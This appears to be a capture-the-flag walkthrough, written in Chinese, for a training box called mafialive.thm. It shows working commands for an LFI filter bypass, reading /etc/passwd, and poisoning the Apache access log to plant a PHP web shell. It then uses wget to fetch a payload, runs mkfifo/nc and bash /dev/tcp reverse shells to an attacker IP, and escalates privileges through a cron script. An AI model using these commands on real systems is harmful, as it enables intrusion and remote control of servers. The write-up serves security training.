# Recoon

- nmap

![](https://hackmd.io/_uploads/Hk5JZOh-a.png)

- 有開啟80port，嘗試爆網頁路徑吧
    - `gobuster dir -u http://10.10.165.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![](https://hackmd.io/_uploads/BkUcbOh-6.png)

- 有flags的分頁，結果點進去是林克搖~.~
- 重新看題目提示告訴你是另一個hostname

![](https://hackmd.io/_uploads/Hy3bzd3ZT.png)

- 把IP跟域名加入/etc/hosts中

![](https://hackmd.io/_uploads/HyilXOhZ6.png)

# Web & dirb

- 嘗試爆網頁路徑
    - `gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

- 發現有robots.txt

![](https://hackmd.io/_uploads/rJAXE_h-a.png)

- 還有其他路徑

![](https://hackmd.io/_uploads/BJRU4OnZp.png)

- 點擊按鈕後，確認有LFI
    - 使用base64 LFI語法
    - `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`

![](https://hackmd.io/_uploads/rkANB_2Z6.png)

- 成功
- 嘗試將mrrobot.php換成test.php

![](https://hackmd.io/_uploads/rk7l3d3-a.png)

- 來看網頁源碼吧

--
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

--

- code review 後發現禁止../.. 但又必須有/var/www/html/development_testing
    - `curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././etc/passwd
`
![](https://hackmd.io/_uploads/HyUSyFn-p.png)

- 將/etc/passwd 改成 /var/log/apache2/access.log

![](https://hackmd.io/_uploads/By83yKn-p.png)

- 看完log後發現似乎都是依據IP使用NC寫PHP

![](https://hackmd.io/_uploads/BkxkQth-p.png)

- 使用nc來寫php info
    - `nc 10.10.165.211 80`
        - `GET /?<?php phpinfo(); ?>`

![](https://hackmd.io/_uploads/ryATmF3b6.png)

- 還真的跑出php info 哭阿

- 寫個php cmd好了
    - `nc 10.10.165.211 80`
        - `GET /<?php system($_GET[A]); ?>`

- 在attacker撰寫一個reverse_shell
    - `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

# Reverse

- attacker
    - `python -m http.server 4455`
- victim
    - `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&A=wget http://10.9.76.81/Y -O /tmp/Y`

![](https://hackmd.io/_uploads/rkPY9L6Wa.png)

- 在victim啟動reverse shell
    - `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&A=bash%20/tmp/Y`

- attacker 

![](https://hackmd.io/_uploads/SJuiALT-p.png)

    - 直接在home底下找到user.txt
    
# PrivESC

- 先嘗試sudo -l後沒有辦法
- 查看crontab

![](https://hackmd.io/_uploads/SJrfDwaWp.png)

- 發現/opt/helloworld.sh 使用archangel啟動
- 嘗試cat helloworld.sh

![](https://hackmd.io/_uploads/rJPKwwTWT.png)

- 加入reverseshell
    - victim
        - `echo "bash -c 'bash -i >& /dev/tcp/10.9.76.81/7877 0>&1''`
    - attacker 
        - `nc -lvnp 7877`

![image.png](https://hackmd.io/_uploads/HkIeDpDQa.png)

- 除了user2.txt 還有backup的檔案

![image.png](https://hackmd.io/_uploads/BJNXwpDXp.png)

![image.png](https://hackmd.io/_uploads/rJVXupPQa.png)

![image.png](https://hackmd.io/_uploads/BkjmO6vQa.png)

![image.png](https://hackmd.io/_uploads/HJSrdaw7p.png)



